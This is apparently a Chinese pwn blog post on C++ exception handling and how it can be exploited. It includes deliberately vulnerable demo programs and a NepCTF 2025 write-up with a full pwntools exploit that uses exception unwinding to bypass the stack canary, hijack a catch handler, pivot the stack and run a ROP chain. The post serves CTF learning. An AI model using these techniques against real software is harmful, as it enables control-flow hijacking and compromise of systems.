+++
date = '2025-08-28T21:51:40+08:00'
draft = false
title = 'C++pwn之异常处理'
categories = ["pwn"]

+++



<!--more-->

## 异常处理机制

### 基础语法

异常机制中主要的几个关键字：`throw` 抛出异常，`try-catch`响应异常

```cpp
#include <iostream>
using namespace std;

int main() {
    int x, y;
    cout << "请输入两个整数（x y）：";
    cin >> x >> y;

    try {
        if (y == 0) {
            // 抛出异常：除数不能为 0
            throw runtime_error("除数不能为 0！");
        }
        cout << "结果: " << x / y << endl;
    } catch (const runtime_error& e) {
        // 捕获并处理异常
        cout << "发生异常：" << e.what() << endl;
    }

    cout << "程序继续运行..." << endl;
    return 0;
}

```

输入 `10 2` ， 输出 `结果: 5`

输入`10 0`，会输出

```
发生异常：除数不能为 0！
程序继续运行...
```

#### try、catch

```cpp
 try {
 	program-statements
 } catch (exception-declaration) {
 	handler-statements
 } catch (exception-declaration) {
 	handler-statements
 } // .. . 
```

1. **try块**
	- 用 `try { ... }` 包裹可能产生异常的代码。
	- 在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。
2. **catch块**
	- 当 try 内抛出异常时，运行时会寻找匹配的 catch。
	- 一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句



####  函数退出与栈展开

在复杂的程序中，可能在一个`try`语句中嵌套另一个`try`语句



**stack unwinding（栈展开）：**

- 当一个异常被抛出，如果没有对应的`catch`能处理，就会终止这个函数，并返回给调用者
- 调用者继续查找自己的 `try...catch`
- 如果仍未找到 → 再返回上层调用者 … 一直往上追溯
- 如果最终没找到任何合适的 catch ，就会调用标准库函数 `terminate()`，程序直接退出
- 如果在某一层找到了匹配的`catch`，那么程序就会进入这个`catch`块执行，当 `catch` 执行完，程序会跳到该 `try-catch` 的最后一个 catch 之后继续执行。

```cpp
#include <iostream>
#include <stdexcept>
using namespace std;

void funcC() {
    cout << "进入 funcC" << endl;
    throw runtime_error("funcC 出现异常"); // 抛出异常
    cout << "funcC 正常结束" << endl;       // 不会执行
}

void funcB() {
    cout << "进入 funcB" << endl;
    funcC(); // 调用 funcC
    cout << "funcB 正常结束" << endl; // 不会执行
}

void funcA() {
    cout << "进入 funcA" << endl;
    try {
        funcB(); // 调用 funcB
    } catch (const runtime_error& e) {
        cout << "捕获异常: " << e.what() << endl;
    }
    cout << "funcA 继续执行" << endl;
}

int main() {
    funcA();
    cout << "main 继续执行" << endl;
    return 0;
}

```

输出结果：

```
进入 funcA
进入 funcB
进入 funcC
捕获异常: funcC 出现异常
funcA 继续执行
main 继续执行
```



#### RAII

C++异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，**现代 C++ 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）**：

- 把资源放到对象里（比如 `std::vector` 自动释放内存）
- 这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源







### 高级异常机制

当一个异常被`throw`时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的`catch`中，这会导致：

- 在跳转过程中，调用栈上沿途的函数会被退出
- 退出时，局部对象会正常调用析构函数



#### 对象销毁

当 `throw` 发生时，函数会提前退出，局部对象（local objects）会自动销毁

- **类对象**：编译器会自动调用它们的析构函数
- **构造函数中异常**：类本身的析构函数不会执行，但已经成功构造的成员会被析构
- **数组 / 容器异常**：已经构造的元素会被析构，未构造的不会
- **内置类型**：不需要析构，退出时只是栈帧释放。



#### 析构函数与异常

栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 `std::terminate()`，程序立刻结束

如：

```cpp
struct Bad {
    ~Bad() {
        throw std::runtime_error("oops in destructor"); // 危险！
    }
};

int main() {
    try {
        Bad b;
        throw std::runtime_error("main error");
    } catch (...) {
        std::cout << "Caught exception\n";
    }
}
```

所以，析构函数如果会抛出异常，需要用`try-catch`把他包起来，不能让异常传播出去

如 

```c++
struct Good {
    ~Good() {
        try {
            // 某些可能抛异常的操作
            throw std::runtime_error("oops in destructor");
        } catch (...) {
            // 在这里处理，不能让它继续抛
            std::cerr << "Exception caught in destructor\n";
        }
    }
};
```



#### throw



**异常对象的构建**

```cpp
throw std::runtime_error("Something bad happened");
```

- 这个表达式会创建一个特殊的对象：称为**异常对象**，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈
- 传给`catch`的时候，是先复制一份，再传过去



**不能抛出局部对象的指针**

栈展开时，局部对象会被销毁

```cpp
int* f() {
    int x = 42;
    throw &x; // x 会在函数退出时销毁
}
```

等`catch`执行时，这个对象可能已经销毁，造成悬空指针



**抛出异常时对类型的要求**

- 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如：

	```
	//只有声明而没有定义
	class Incomplete; // 声明
	
	void foo() {
	    throw Incomplete(); 
	}
	```

- 类类型必须有可访问的析构函数

- 类类型必须有可访问的拷贝构造函数或移动构造函数

- 当抛出数组或函数时， 数组或函数类型会自动转成指针类型



#### catch



**catch的参数就行函数参数**

- `catch (类型 参数名)` 的写法很像函数的参数声明

- 如果你不需要用到这个参数，可以省略名字：

	```cpp
	catch (std::runtime_error&) { ... }
	```



**catch参数类型规则**

- 必须是 **完整类型**
- 允许左值引用 `catch (MyEx&)`、禁止右值引用 `catch (MyEx&&)`



**匹配规则**

当一个异常被`throw`，程序会按顺序检查所有`catch`，第一个能匹配的catch会被选中，不会继续往后寻找

因此，**更具体的异常类型必须放在更前面**，如果有继承关系，**子类的 catch 必须写在前面**，基类的写在后面。



**rethrow**

有时候，一个 `catch` 只能做一部分处理，但真正的处理逻辑要交给更上层的函数

这时候，`catch` 里可以用 `throw;` 语句把当前异常重新抛出，交给上层的 `catch` 来继续处理。

```cpp
catch (std::exception& e) {
    std::cerr << "Log: " << e.what() << "\n";
    throw; 
}
```



**The Catch-All Handler**

`catch(...)` 是一种特殊的 `catch` 块，用于**捕获任何类型的异常**

```c++
try {
    throw 42;  
} catch (...) {
    std::cout << "Caught something!";  
}
```













#### try



**普通try块（ordinary try block）**

- 只对 `try { ... }` 内部抛出的异常有效。
- 会按顺序匹配，第一个符合类型的 handler 会接管。
- 在 try 外面抛出的异常，跟这个 handler 没关系。

```cpp
void f() {
    throw 1;  // 不会被下面的 catch 捕获
    try {
        throw 2; // 会被下面的 catch(...) 捕获
    } catch (...) {
        // 处理 2
    }
    throw 3;  // 也不会被上面的捕获
}
```



**函数try块（function try block）**

和普通 try 不同，它不是语句，而是 **整个函数体** 被 `try` 包裹

它的作用范围比普通的广，它能捕获：

- 函数体里的异常
- （如果是构造函数）初始化列表里的异常

```cpp
struct X {
    int mem;

    // 构造函数初始化列表抛出异常
    X() try : mem(f(true)) {
        // 构造函数体
    } catch (...) {
        // 能捕获 f(true) 抛出的异常
    }

    // 构造函数体里抛出的异常
    X(int) try {
        throw 2;
    } catch (...) {
        // 捕获 2
    }
};
```





#### noexcept

了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序

```cpp
void recoup(int) noexcept;   // 不会抛异常
void alloc(int);             // 可能抛异常
```

我们用`noexcept`来承诺一个函数不会抛出异常，这种承诺叫做**nonthrowing specification**（不抛异常说明）



需要注意：

- `noexcept` 必须出现在所有函数声明和定义里，或者都不出现

	```cpp
	void f() noexcept;     // 声明
	void f() noexcept { }  // 定义
	```

- 如果函数声明为 `noexcept`，但运行时仍然抛出异常，程序会调用 `std::terminate`，直接结束



`noexcept`应该在以下两种情形中被使用：

- 我们确信该函数不会抛出异常
- 我们不知道如何处理异常





### pwn中的利用



#### demo1

> 修改rbp控制程序执行流

```cpp
// exception.cpp
// g++ exception.cpp -o exc -no-pie -fPIC
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
void backdoor()
{
    try
    {
        printf("We have never called this backdoor!");
    }
    catch (const char *s)
    {
        printf("[!] Backdoor has catched the exception: %s\n", s);
        system("/bin/sh");
    }
}
 
class x
{
public:
    char buf[0x10];
    x(void)
    {
        // printf("x:x() called!\n");
    }
    ~x(void)
    {
        // printf("x:~x() called!\n");
    }
};
 
void input()
{
    x tmp;
    printf("[!] enter your input:");
    fflush(stdout);
    int count = 0x100;
    size_t len = read(0, tmp.buf, count);
    if (len > 0x10)
    {
        throw "Buffer overflow.";
    }
    printf("[+] input() return.\n");
}
 
int main()
{
    try
    {
        input();
        printf("--------------------------------------\n");
        throw 1;
    }
    catch (int x)
    {
        printf("[-] Int: %d\n", x);
    }
    catch (const char *s)
    {
        printf("[-] String: %s\n", s);
    }
    printf("[+] main() return.\n");
    return 0;
}
```

把input函数的rbp改成`puts_got - 8`，程序就会跳到`puts_got`中存储的地址去执行，也就是执行`puts`函数

```python
pl = b'a'*0x30 + p64(0x404050 -8 ) #puts_got -8
p.sendafter(b'input:',pl)
```

这里有几个点：

- pl覆盖了`input`函数的`canary`，但是由于栈展开，直接去到上层调用链找catch，不会检查`canary`
- `input`函数[rbp]存的是`main`函数的`rbp`，减去8就是main函数的返回地址，这里是去改main函数的返回地址为puts函数







#### demo2

> 修改retaddr，调用其他catch

```cpp
// exception.cpp
// g++ exception.cpp -o exc -no-pie -fPIC
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
void backdoor()
{
    try
    {
        printf("We have never called this backdoor!");
    }
    catch (const char *s)
    {
        printf("[!] Backdoor has catched the exception: %s\n", s);
        system("/bin/sh");
    }
}

class x
{
public:
    char buf[0x10];
    x(void)
    {
        // printf("x:x() called!\n");
    }
    ~x(void)
    {
        // printf("x:~x() called!\n");
    }
};
 
void test()
{
 x tmp;
 printf("[!] enter your input:");
 fflush(stdout);
 int count = 0x100;
 size_t len = read(0, tmp.buf, count);
 if (len > 0x10)
 {
     throw "Buffer overflow.";
 }
 printf("[+] test() return.\n");
}
 
void input()
{
 try
 {
     test();
 }
 catch (const char *s)
 {
     printf("[-] String(From input): %s\n", s);
 }
 printf("[+] input() return.\n");
}
 
int main()
{
    try
    {
        input();
        printf("--------------------------------------\n");
        throw 1;
    }
    catch (int x)
    {
        printf("[-] Int: %d\n", x);
    }
    catch (const char *s)
    {
        printf("[-] String: %s\n", s);
    }
    printf("[+] main() return.\n");
    return 0;
}
```

这里，我们发送`pl1`，就能调用到`backdoor`函数里的catch

```py
pl = pad + p64(0x404050-0x8)#puts_got -8
pl1 =  b'a'*0x30+ p64(0x404050-0x8) + p64(0x401292+1)#backdoor_addr + 1

p.sendafter(b'input:',pl1)
```

`pl1`把`input`函数的返回地址改成了`backdoor_addr + 1`，而抛出异常是在`input`函数里抛出的，此时的调用链就变成了`input` -> `backdoor`，`input`中没有找到对应的handler，`backdoor`中有，就去执行`backdoor`里的了

- 为什么需要把`backdoor_addr`去加1？返回地址需要在backdoor函数try区域内，demo2中的范围是(0x401293,0x401297]









## NepCTF 2025 canutrytry

> 修改rbp控制程序执行流+修改retaddr调用其他catch+栈迁移

### 逆向分析

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+4h] [rbp-2Ch] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  init();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      std::istream::operator>>(&std::cin, &v3);
      if ( v3 != 1 )
        break;
      visit();
    }
    if ( v3 != 2 )
      exit(0);
    leave();
  }
}
```

在`init`中：

- 开了沙箱，只允许四个系统调用，`read`、`write`、`close`、`futex`，
- 打开了flag，把flag读到0x4053c0

提供两个选项`visit`和`leave`

**`visit`**中提供三个选项：

- **left：**根据size_list申请堆块
- **right：**讲size写入size_list数组
- **stright：**输入index，往相应堆块中读入数据

**`leave：`**

输入index，把堆块内容复制到栈中**（这里存在栈溢出）**，如果size大于0x10，就抛出异常



**异常处理：**

**抛出异常：**

- visit中的left如果检查到size小于等于0,就会抛出**"invalid size"**
- leave中如果检测到size大于0x10就会抛出**"stack overflow"**



`leave`和`visit`中都没有`catch`，`main`中有两个`catch(char const*)`，抛出异常后都会stack unwinding，然后到main中处理

其中一个catch会泄露libc地址和栈地址

```asm
....
mov     rax, cs:setbuf_ptr
mov     rsi, rax
lea     rax, format     ; "setbufaddr:%p\n"
mov     rdi, rax        ; format
mov     eax, 0
call    _printf
lea     rax, [rbp+var_2C]
mov     rsi, rax
lea     rax, aStackaddrP ; "stackaddr:%p\n"
mov     rdi, rax        ; format
mov     eax, 0
call    _printf
;   } // starts at 401FAD
call    ___cxa_end_catch
jmp     loc_401ED4
```



抛出异常的时候并不会调用另一个catch：

```assembly
loc_401F2B:             ; void *
mov     rdi, rax
call    ___cxa_begin_catch
mov     [rbp+var_20], rax
;   try {
call    write_shellcode
;   } // starts at 401F37
nop
call    ___cxa_end_catch
call    enterflag_writerbp
mov     eax, 0
mov     rdx, [rbp+var_18]
sub     rdx, fs:28h
jz      loc_402060
loc_402060:
mov     rbx, [rbp+var_8]
leave
retn
; } // starts at 401EB3
main endp
```



`enterflag_writerbp`中的另一个catch就是执行leave;ret（给了栈迁移的思路）

{{< image src="/img/C++pwn/canutrytry/catch.png" alt="图片显示错误" width="800px" height="800px">}}



### 思路过程

- 首先，泄露出libc和栈地址

- leave中栈溢出写retaddr为这个try内的地址（就能去调用到那个不会被调用到的catch）

	```assembly
	.text:0000000000401ED4 ;   try {
	.text:0000000000401ED4                 call    menu
	.text:0000000000401ED4 ;   } // starts at 401ED4
	```

- 接着写入rop链，栈迁移到这里执行rop链





exp:

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')

address = './pwn'

elf = ELF(address)
libc = elf.libc

gdbscript = \
"""
    bp 0x4019d1
    c
"""
if len(sys.argv) > 1 and sys.argv[1] == "r":
    p = remote("192.168.0.1",8000 )
elif len(sys.argv) > 1 and sys.argv[1] == "d":
    p = gdb.debug(address, gdbscript = gdbscript)
else:
    p = process(address)

def dbg():
    gdb.attach(p)
    # pause()

def cmd(choice):
    p.sendlineafter(b'>>',str(choice).encode())

def leave(index):
    cmd(2)
    p.sendlineafter(b'index: ',str(index).encode())

def left():
    cmd(1)
    p.sendlineafter(b'>>',b'1')

def right(size):
    cmd(1)
    p.sendlineafter(b'>>',b'2')
    p.sendlineafter(b'size:',str(size).encode())

def stright(index,content):
    cmd(1)
    p.sendlineafter(b'>>',b'3')
    p.sendlineafter(b'index:',str(index))
    p.sendafter(b'content:',content)


right(0x30)
right(-1)
left()
left()
p.recvuntil(b'setbufaddr:')
libc.address = int(p.recv(14),16) - 0x88060
p.recvuntil(b'stackaddr:')
stack = int(p.recv(14),16)
success("libc -> 0x%x",libc.address)
success("stack -> 0x%x",stack)
pl = b'a'*0x20 + p64(stack-0x14) + p64(0x401ED4+1) #不能破坏栈
stright(0,pl)
leave(0)

#进入另一个catch
p.recvuntil(b'now!\n')
#write(2,0x4053c0,0x20)
flag_addr = 0x4053c0
#shellcode_addr = 0x405460
pop_rax_ret = 0x45eb0 + libc.address
pop_rdi_ret = 0x2a3e5+ libc.address
pop_rsi_ret = 0x2be51  + libc.address
pop_rdx_r12_ret = 0x11f497+ libc.address
rop = p64(0xdeedbeef)
rop += p64(pop_rdi_ret) + p64(2)
rop += p64(pop_rsi_ret) + p64(flag_addr)
rop += p64(pop_rdx_r12_ret) + p64(0x100)*2
rop += p64(libc.symbols['write'])

p.send(rop)

# pl = p64(0x405460)
pl = b'flag'
p.sendafter(b'flag: ',pl) #0x405400 -> 0x405460(rop)


pl = b'a'*0x10 + p64(0x405460)
# dbg()
p.send(pl)

p.interactive()
# 0x0000000000045eb0 : pop rax ; ret
# 0x000000000002a3e5 : pop rdi ; ret
# 0x000000000002be51 : pop rsi ; ret
# 0x000000000011f497 : pop rdx ; pop r12 ; ret
```





## 参考文章

《C++.Primer.5th.Edition_2013》

https://en.cppreference.com/w/cpp/language/try.html

https://bbs.kanxue.com/thread-284745.htm

[C++异常处理机制及其利用研究](https://c-lby.top/2024/cpp-exception/)
